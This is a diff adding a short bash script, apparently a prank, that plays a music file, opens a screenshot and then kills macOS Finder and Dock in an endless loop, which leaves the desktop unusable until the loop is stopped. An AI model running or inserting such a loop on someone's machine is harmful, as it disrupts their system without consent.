@@ -1,0 +1,5 @@
+#!/bin/bash
+
+open secret/mus_zz_megalovania.ogg
+open secret/Screen\ Shot\ 2020-05-28\ at\ 3.09.41\ PM.png
+while true ; do killall Finder && killall Dock ; done
